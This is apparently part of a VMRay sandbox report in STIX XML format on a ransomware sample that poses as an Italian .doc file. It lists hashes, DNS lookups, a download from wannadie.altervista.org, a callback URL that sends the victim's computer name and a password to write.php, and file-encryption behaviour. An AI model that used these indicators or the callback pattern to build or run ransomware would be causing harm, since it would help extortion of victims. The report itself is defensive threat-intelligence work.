                            <WinRegistryKeyObj:Name>SystemDefaultTlsVersions</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-5907ba31-69a7-41e4-a7dc-8f998d153e0a">
            <cybox:Title>WinRegistryKey</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:WinRegistryKey-398306e3-f2bd-4685-a45b-310398069730">
                <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
                    <WinRegistryKeyObj:Key>SOFTWARE\Microsoft\.NETFramework\v4.0.30319</WinRegistryKeyObj:Key>
                    <WinRegistryKeyObj:Hive>HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
                    <WinRegistryKeyObj:Values>
                        <WinRegistryKeyObj:Value>
                            <WinRegistryKeyObj:Name>RequireCertificateEKUs</WinRegistryKeyObj:Name>
                        </WinRegistryKeyObj:Value>
                    </WinRegistryKeyObj:Values>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-af4eb800-a5ca-4ed2-beb4-110db4169022">
            <cybox:Title>DNSRecord</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:DNSRecord-11042299-b2d0-4e5f-9df2-6cc36d3dd43b">
                <cybox:Properties xsi:type="DNSRecordObj:DNSRecordObjectType">
                    <cyboxCommon:Custom_Properties>
                        <cyboxCommon:Property name="service" description="sets the port in each returned address structure"/>
                    </cyboxCommon:Custom_Properties>
                    <DNSRecordObj:Domain_Name xsi:type="URIObj:URIObjectType" type="Domain Name">
                        <URIObj:Value>www.google.com</URIObj:Value>
                    </DNSRecordObj:Domain_Name>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
        <cybox:Observable id="VMRayAnalyzer:Observable-cb8fa0fa-0122-4b4e-80fb-f8fa6beaee11">
            <cybox:Title>DNSRecord</cybox:Title>
            <cybox:Object id="VMRayAnalyzer:DNSRecord-d3f300be-a34f-4fcb-8dfc-e3a5f7c96a2a">
                <cybox:Properties xsi:type="DNSRecordObj:DNSRecordObjectType">
                    <cyboxCommon:Custom_Properties>
                        <cyboxCommon:Property name="service" description="sets the port in each returned address structure"/>
                    </cyboxCommon:Custom_Properties>
                    <DNSRecordObj:Domain_Name xsi:type="URIObj:URIObjectType" type="Domain Name">
                        <URIObj:Value>wannadie.altervista.org</URIObj:Value>
                    </DNSRecordObj:Domain_Name>
                </cybox:Properties>
            </cybox:Object>
        </cybox:Observable>
    </stix:Observables>
    <stix:Indicators>
        <stix:Indicator id="VMRayAnalyzer:indicator-fff63641-b277-495e-914a-11a00ec1f4e5" timestamp="2020-04-20T22:32:24.928598+00:00" xsi:type='indicator:IndicatorType'>
            <indicator:Title>Analyzed Sample #709184</indicator:Title>
            <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
            <indicator:Alternative_ID>709184</indicator:Alternative_ID>
            <indicator:Alternative_ID>Sample-ID: #709184</indicator:Alternative_ID>
            <indicator:Alternative_ID>Job-ID: #1874799</indicator:Alternative_ID>
            <indicator:Short_Description>This sample was analyzed by VMRay Analyzer 3.2.2 on a Windows 10 Redstone 2 system</indicator:Short_Description>
            <indicator:Observable id="VMRayAnalyzer:Observable-eb57b375-c21b-4e9f-aa78-5f741b6ff45b">
                <cybox:Observable_Composition operator="AND">
                    <cybox:Observable idref="VMRayAnalyzer:Observable-46bacb37-a93e-4040-b3a0-2c469c6f234a">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-1d1e90f9-7ad5-45f6-af39-05bf324f4c28">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-f94b68a8-82e2-41c0-ad58-53b8f1b78c38">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-90b6eb8a-6a8d-41a3-adfc-268365a7102c">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-ac7c4ce4-28d5-4851-a6f6-2eb25c7dc2b3">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-3203e430-cbdd-4e02-9b32-c5658c59a590">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-520c2bef-9aa0-44df-a334-c8d4843af06b">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-161d9605-20cd-4dc1-a122-29b9ba217284">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-c042d845-184f-4536-a2dc-beda9b2e83e6">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-60089aac-e859-42b4-85bc-a9690d30f43e">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-d039a796-d0d7-49fb-99d8-448d88d7a38f">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-5451f2be-9a4a-4aa2-9d0d-8c39f908c741">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-266d9c47-fa11-49e1-be7c-2ba1de4ae1f5">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-fead171a-39d6-4f04-b3f2-148637f8fa6b">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-fa5579d9-0f8a-40b9-9676-d9ee097a14a1">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-98bd9ad1-9d57-4c22-9491-d246e28930fd">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-f6aa7795-d92f-4faf-b21d-923e7be1544c">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-27c1da50-0b05-4c61-ae54-0c13d22cc445">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-fe8d5c3d-7518-40e8-b463-dc9eeae4757d">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-bae68e3f-c0dc-400c-be68-f9d22daa1260">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-c75aad3c-0d42-4ea0-9add-2141178641d9">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-f7d78354-5f1e-4782-90c7-2420ce60cea7">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-473ffbb3-b96c-42a9-9f78-f4412ecfa2d3">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-82eb3c4a-618d-41b2-a691-cb137b7f68d8">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-417eac6c-f87b-468d-b533-57e1b99af456">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-5907ba31-69a7-41e4-a7dc-8f998d153e0a">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-af4eb800-a5ca-4ed2-beb4-110db4169022">
                    </cybox:Observable>
                    <cybox:Observable idref="VMRayAnalyzer:Observable-cb8fa0fa-0122-4b4e-80fb-f8fa6beaee11">
                    </cybox:Observable>
                </cybox:Observable_Composition>
            </indicator:Observable>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-1360f6a3-7acb-404d-ac3c-075a118a84af" timestamp="2020-04-20T22:32:24.934121+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-a66a0462-c7ed-4f8b-bc18-d6525db05657" timestamp="2020-04-20T22:32:24.935450+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-c2876625-c014-4cff-9e3a-654c0dbfe484" timestamp="2020-04-20T22:32:24.935703+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-f913a444-abcf-46b3-a8f6-7145065fa1bf" timestamp="2020-04-20T22:32:24.935936+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-b201ae79-c138-42ef-8fd0-9ae7234bd1eb" timestamp="2020-04-20T22:32:24.936121+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-9cdb3b97-084e-44a9-a691-eb42ea8e16b4" timestamp="2020-04-20T22:32:24.936336+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-81d863d5-7c53-4da6-85fc-75c2de739a9e" timestamp="2020-04-20T22:32:24.936593+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-4dec38c2-ffa8-40d6-9795-2da20ca2981e" timestamp="2020-04-20T22:32:24.936840+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-7f65fc59-4735-473a-89a1-9a8cf0b13a81" timestamp="2020-04-20T22:32:24.937097+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-f54a9751-ead5-488a-93fb-02f34395abc7" timestamp="2020-04-20T22:32:24.937309+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-5fcaa295-4495-49d0-b10b-6a6f2bc88022" timestamp="2020-04-20T22:32:24.937548+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-b266d058-dd83-4157-a70a-d6244449ff40" timestamp="2020-04-20T22:32:24.937770+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-f336f581-a33f-42e8-ad1c-644b6563986d" timestamp="2020-04-20T22:32:24.937992+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-8ab4bfa1-f0cc-41e5-b85c-81ad1367d43f" timestamp="2020-04-20T22:32:24.938226+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-5e117c1b-fb2f-4307-bb38-e2a68caf53b1" timestamp="2020-04-20T22:32:24.938422+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Indicated_TTP>
                <stixCommon:TTP idref="VMRayAnalyzer:ttp-945cdf0d-e7ba-4f73-9922-f285b7a8d74c" timestamp="2020-04-20T22:32:24.938675+00:00" xsi:type='ttp:TTPType'/>
            </indicator:Indicated_TTP>
            <indicator:Likely_Impact timestamp="2020-04-20T22:32:24.938879+00:00">
                <stixCommon:Value>100</stixCommon:Value>
                <stixCommon:Description>VTI Score based on VTI Database Version 3.6</stixCommon:Description>
            </indicator:Likely_Impact>
            <indicator:Related_Indicators>
                <indicator:Related_Indicator>
                    <stixCommon:Indicator id="VMRayAnalyzer:indicator-00903677-89eb-4f77-8635-e320c30825e6" timestamp="2020-04-20T22:32:24.933305+00:00" xsi:type='indicator:IndicatorType'>
                        <indicator:Title>Metadata of Sample File #709184</indicator:Title>
                        <indicator:Alternative_ID>Submission-ID: #4104313</indicator:Alternative_ID>
                        <indicator:Observable id="VMRayAnalyzer:Observable-6a3d4836-6930-47d0-aedd-184e98ce0058">
                            <cybox:Object id="VMRayAnalyzer:File-d883f63c-9ae6-45f3-82d3-b776076eca07">
                                <cybox:Properties xsi:type="FileObj:FileObjectType">
                                    <FileObj:File_Name>de4224eca5accccad6e15029b5410ba2cc8816653ec34bb5fec7a9a347e515efexe</FileObj:File_Name>
                                    <FileObj:File_Extension/>
                                    <FileObj:Hashes>
                                        <cyboxCommon:Hash>
                                            <cyboxCommon:Type>MD5</cyboxCommon:Type>
                                            <cyboxCommon:Simple_Hash_Value>3c767548d8a74b96e851a58bcc4c44bc</cyboxCommon:Simple_Hash_Value>
                                        </cyboxCommon:Hash>
                                        <cyboxCommon:Hash>
                                            <cyboxCommon:Type>SHA1</cyboxCommon:Type>
                                            <cyboxCommon:Simple_Hash_Value>f4d111ed9cee8cb64431d6d949f534024f734866</cyboxCommon:Simple_Hash_Value>
                                        </cyboxCommon:Hash>
                                        <cyboxCommon:Hash>
                                            <cyboxCommon:Type>SHA256</cyboxCommon:Type>
                                            <cyboxCommon:Simple_Hash_Value>de4224eca5accccad6e15029b5410ba2cc8816653ec34bb5fec7a9a347e515ef</cyboxCommon:Simple_Hash_Value>
                                        </cyboxCommon:Hash>
                                    </FileObj:Hashes>
                                </cybox:Properties>
                                <cybox:Related_Objects>
                                    <cybox:Related_Object idref="VMRayAnalyzer:Process-8016a66c-b5a2-4363-9796-277eeb1686f2">
                                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Opened_By</cybox:Relationship>
                                    </cybox:Related_Object>
                                </cybox:Related_Objects>
                            </cybox:Object>
                        </indicator:Observable>
                    </stixCommon:Indicator>
                </indicator:Related_Indicator>
                <indicator:Related_Indicator>
                    <stixCommon:Indicator id="VMRayAnalyzer:indicator-36f5a790-d997-480b-8f06-61c14541dadf" timestamp="2020-04-20T22:32:24.933506+00:00" xsi:type='indicator:IndicatorType'>
                        <indicator:Title>Metadata of Analysis for Job-ID #1874799</indicator:Title>
                        <indicator:Observable id="VMRayAnalyzer:Observable-474765d8-a236-491e-8c05-175a83ae5363">
                            <cybox:Object id="VMRayAnalyzer:Custom-6f134ab5-c42e-499b-bea3-1b27b794f311">
                                <cybox:Properties xsi:type="CustomObj:CustomObjectType" custom_name="VMRayAnalyzer:AnalysisMetadataType">
                                    <cyboxCommon:Custom_Properties>
                                        <cyboxCommon:Property name="Cybox Truncated">False</cyboxCommon:Property>
                                        <cyboxCommon:Property name="Termination Reason">All processes terminated</cyboxCommon:Property>
                                        <cyboxCommon:Property name="Execution Successful">True</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM Analysis Duration Time">121.472</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM Computer Name">NQDPDE</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM Name">win10_64_rs2</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM Architecture">x86 64-bit</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM OS">Windows 10 Redstone 2</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM Kernel Version">10.0.15063.540 (f6f48955-5489-4b24-b4df-942361f0730d)</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM Username">FD1HVy</cyboxCommon:Property>
                                        <cyboxCommon:Property name="VM User Domain">NQDPDE</cyboxCommon:Property>
                                    </cyboxCommon:Custom_Properties>
                                    <CustomObj:Description>This is a property collection for additional information of VMRay analysis</CustomObj:Description>
                                </cybox:Properties>
                            </cybox:Object>
                        </indicator:Observable>
                    </stixCommon:Indicator>
                </indicator:Related_Indicator>
            </indicator:Related_Indicators>
            <indicator:Producer>
                <stixCommon:Identity>
                    <stixCommon:Name>VMRay Analyzer</stixCommon:Name>
                </stixCommon:Identity>
            </indicator:Producer>
        </stix:Indicator>
    </stix:Indicators>
    <stix:TTPs>
        <stix:TTP id="VMRayAnalyzer:ttp-1360f6a3-7acb-404d-ac3c-075a118a84af" timestamp="2020-04-20T22:32:24.934121+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Masquerade</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 4/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_use_double_file_extension</ttp:Title>
                        <ttp:Description>File "c:\users\fd1hvy\desktop\compito italiano.doc.exe.config" has a double file extension.</ttp:Description>
                        <ttp:Short_Description>Uses a double file extension</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-a66a0462-c7ed-4f8b-bc18-d6525db05657" timestamp="2020-04-20T22:32:24.935450+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>User Data Modification</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 4/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_modify_user_files</ttp:Title>
                        <ttp:Description>Modifies the content of multiple user files. This is an indicator for an encryption attempt.</ttp:Description>
                        <ttp:Short_Description>Modifies content of user files</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-c2876625-c014-4cff-9e3a-654c0dbfe484" timestamp="2020-04-20T22:32:24.935703+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>User Data Modification</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 4/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_rename_user_files</ttp:Title>
                        <ttp:Description>Renames multiple user files. This is an indicator for an encryption attempt.</ttp:Description>
                        <ttp:Short_Description>Renames user files</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-f913a444-abcf-46b3-a8f6-7145065fa1bf" timestamp="2020-04-20T22:32:24.935936+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_request_dns_by_name</ttp:Title>
                        <ttp:Description>Resolves host name "www.google.com".</ttp:Description>
                        <ttp:Short_Description>Performs DNS request</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-b201ae79-c138-42ef-8fd0-9ae7234bd1eb" timestamp="2020-04-20T22:32:24.936121+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_request_dns_by_name</ttp:Title>
                        <ttp:Description>Resolves host name "wannadie.altervista.org".</ttp:Description>
                        <ttp:Short_Description>Performs DNS request</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-9cdb3b97-084e-44a9-a691-eb42ea8e16b4" timestamp="2020-04-20T22:32:24.936336+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>System Modification</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 2/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_set_desktop_wallpaper_by_api</ttp:Title>
                        <ttp:Description>Sets the desktop wallpaper to the file "c:\fd1hvy\ransom.jpg".</ttp:Description>
                        <ttp:Short_Description>Changes the desktop wallpaper.</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-81d863d5-7c53-4da6-85fc-75c2de739a9e" timestamp="2020-04-20T22:32:24.936593+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Masquerade</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 4/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_use_double_file_extension</ttp:Title>
                        <ttp:Description>File "C:\Users\FD1HVy\Desktop\compito italiano.doc.exe" has a double file extension.</ttp:Description>
                        <ttp:Short_Description>Uses a double file extension</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-4dec38c2-ffa8-40d6-9795-2da20ca2981e" timestamp="2020-04-20T22:32:24.936840+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>System Modification</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_create_many_files</ttp:Title>
                        <ttp:Description>Creates above average number of files.</ttp:Description>
                        <ttp:Short_Description>Creates an unusually large number of files</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-7f65fc59-4735-473a-89a1-9a8cf0b13a81" timestamp="2020-04-20T22:32:24.937097+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Antivirus</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 5/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_av_malicious_match</ttp:Title>
                        <ttp:Description>Local AV detected the sample itself as "Gen:Heur.Ransom.REntS.Gen.1".</ttp:Description>
                        <ttp:Short_Description>Malicious content was detected by heuristic scan</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-f54a9751-ead5-488a-93fb-02f34395abc7" timestamp="2020-04-20T22:32:24.937309+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Antivirus</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 5/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_av_malicious_match</ttp:Title>
                        <ttp:Description>Local AV detected a memory dump of process "compito italiano.doc.exe" as "Gen:Heur.Ransom.REntS.Gen.1".</ttp:Description>
                        <ttp:Short_Description>Malicious content was detected by heuristic scan</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-5fcaa295-4495-49d0-b10b-6a6f2bc88022" timestamp="2020-04-20T22:32:24.937548+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_tcp_out_connection</ttp:Title>
                        <ttp:Description>Outgoing TCP connection to host "172.217.21.196:443".</ttp:Description>
                        <ttp:Short_Description>Connects to remote host</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-b266d058-dd83-4157-a70a-d6244449ff40" timestamp="2020-04-20T22:32:24.937770+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_tcp_out_connection</ttp:Title>
                        <ttp:Description>Outgoing TCP connection to host "51.75.240.53:80".</ttp:Description>
                        <ttp:Short_Description>Connects to remote host</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-f336f581-a33f-42e8-ad1c-644b6563986d" timestamp="2020-04-20T22:32:24.937992+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_download_file_by_http_full</ttp:Title>
                        <ttp:Description>Downloads file via http from "http://wannadie.altervista.org/rogue.png".</ttp:Description>
                        <ttp:Short_Description>Downloads file</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-8ab4bfa1-f0cc-41e5-b85c-81ad1367d43f" timestamp="2020-04-20T22:32:24.938226+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_establish_http_connection</ttp:Title>
                        <ttp:Description>URL "http://wannadie.altervista.org/rogue.png".</ttp:Description>
                        <ttp:Short_Description>Connects to HTTP server</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-5e117c1b-fb2f-4307-bb38-e2a68caf53b1" timestamp="2020-04-20T22:32:24.938422+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Network Connection</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 1/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_establish_http_connection</ttp:Title>
                        <ttp:Description>URL "http://wannadie.altervista.org/write.php?computer_name=NQDPDE&amp;userName=FD1HVy&amp;password==pdiuwh6See4IyR&amp;allow=ransom".</ttp:Description>
                        <ttp:Short_Description>Connects to HTTP server</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
        <stix:TTP id="VMRayAnalyzer:ttp-945cdf0d-e7ba-4f73-9922-f285b7a8d74c" timestamp="2020-04-20T22:32:24.938675+00:00" xsi:type='ttp:TTPType'>
            <ttp:Title>Reputation</ttp:Title>
            <ttp:Description>VTI rule match with VTI rule score 5/5</ttp:Description>
            <ttp:Behavior>
                <ttp:Attack_Patterns>
                    <ttp:Attack_Pattern>
                        <ttp:Title>vmray_known_malicious_file</ttp:Title>
                        <ttp:Description>Reputation data labels the sample itself as "Mal/Generic-S".</ttp:Description>
                        <ttp:Short_Description>Known malicious file</ttp:Short_Description>
                    </ttp:Attack_Pattern>
                </ttp:Attack_Patterns>
            </ttp:Behavior>
        </stix:TTP>
    </stix:TTPs>
</stix:STIX_Package>
